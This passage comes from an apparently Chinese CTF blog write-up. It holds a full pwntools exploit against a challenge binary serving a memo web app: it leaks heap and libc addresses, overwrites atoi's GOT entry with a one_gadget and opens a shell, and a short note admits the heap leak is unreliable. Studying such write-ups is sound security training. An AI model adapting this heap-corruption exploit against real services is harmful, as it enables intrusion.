class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">p = process(&apos;./pwn&apos;)</span><br><span class="line">libc = ELF(&apos;libc-so.6&apos;)</span><br><span class="line">elf = ELF(&apos;pwn&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def add(content,index):</span><br><span class="line">    s = &apos;POST &apos;+&apos;/add &apos;+&apos;Connection: keep-alive&apos;</span><br><span class="line">    s += &apos;\n\n&apos;+&apos;memo=&apos;+content+&apos;&amp;count=&apos;+str(index)</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line">def count():</span><br><span class="line">    s = &apos;POST &apos;+&apos;/count &apos;+&apos;Connection: keep-alive&apos;</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line">def listlist():</span><br><span class="line">    s = &apos;GET &apos;+&apos;/list &apos;+&apos;Connection: keep-alive&apos;</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line">add(&apos;A&apos;*8,1)</span><br><span class="line">add(&apos;B&apos;*8,1)</span><br><span class="line">add(&apos;C&apos;*8,1)</span><br><span class="line">add(&apos;D&apos;*8,1)</span><br><span class="line">add(&apos;E&apos;*0x30,1)</span><br><span class="line">add(&apos;F&apos;*0x30,1)</span><br><span class="line">add(&apos;G&apos;*0x30,1)</span><br><span class="line">add(&apos;H&apos;*0x30,1)</span><br><span class="line">add(&apos;F&apos;*24,123456)</span><br><span class="line">sleep(1)</span><br><span class="line">count()</span><br><span class="line">sleep(2)</span><br><span class="line">listlist()</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;0&lt;/td&gt;&apos;)</span><br><span class="line">p.recvuntil(&apos;&lt;td&gt;&apos;)</span><br><span class="line">data = p.recvuntil(&apos;&lt;&apos;)</span><br><span class="line">data = data[:-1]</span><br><span class="line">data = u64(data.ljust(8,&apos;\x00&apos;))</span><br><span class="line">heap_base = data - 0x20</span><br><span class="line">log.success(&apos;heap addr is:&apos;+hex(heap_base))</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">add(p64(heap_base+0x60).replace(&apos;\x00&apos;,&apos;&apos;),1)</span><br><span class="line">count()</span><br><span class="line">sleep(2)</span><br><span class="line">add(&apos;aaaaaaaa\x21&apos;,1)</span><br><span class="line">add(&apos;b&apos;*8+&apos;\x21&apos;*8+p64(elf.got[&apos;atoi&apos;]).replace(&apos;\x00&apos;,&apos;&apos;),12345)</span><br><span class="line">listlist()</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;aaaaaaaa!&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&apos;)</span><br><span class="line">data2 = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">atoi_addr = data2</span><br><span class="line">libc_base = atoi_addr - libc.symbols[&apos;atoi&apos;]</span><br><span class="line">one_gadget = libc_base + 0x45216</span><br><span class="line">log.success(&apos;atoi addr is:&apos;+hex(atoi_addr))</span><br><span class="line">log.success(&apos;onegadget addr is:&apos;+hex(one_gadget))</span><br><span class="line"></span><br><span class="line">add(p64(heap_base+0x180).replace(&apos;\x00&apos;,&apos;&apos;),1)</span><br><span class="line">count()</span><br><span class="line">sleep(2)</span><br><span class="line">add(urllib.quote(flat(0x60306a).ljust(0x30, &apos;A&apos;)),1234)</span><br><span class="line">add(urllib.quote(flat(0x60306a).ljust(0x30, &apos;A&apos;)),1234)</span><br><span class="line">add(urllib.quote(flat(0x60306a).ljust(0x30, &apos;A&apos;)),1234)</span><br><span class="line">add(&apos;A&apos;*6+urllib.quote(flat(p64(one_gadget)).ljust(0x30-14, &apos;A&apos;)),1234)</span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line">p.sendline(&apos;V1NKe is a stupid boy!&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="最后："><a href="#最后：" class="headerlink" title="最后："></a>最后：</h2><p>本人的exp写的较为粗糙，在泄漏heap基地址的时候因为对正则了解较少，所以有时候会出现没有正确计算出heap基地址的情况，解决方法是多试几次即可，或者自行修改成正则匹配。</p>
+
+    
+  </div>
+
+  
+      <div class="git"></div>
+  
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持v1nke</div>
+        <ul>
+        
+          <li class="item">
+            <span>微信扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+          <li class="item">
+            <span>支付宝扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/11/23/2018东华杯ARM PWN/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2019/02/24/tcache利用总结/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
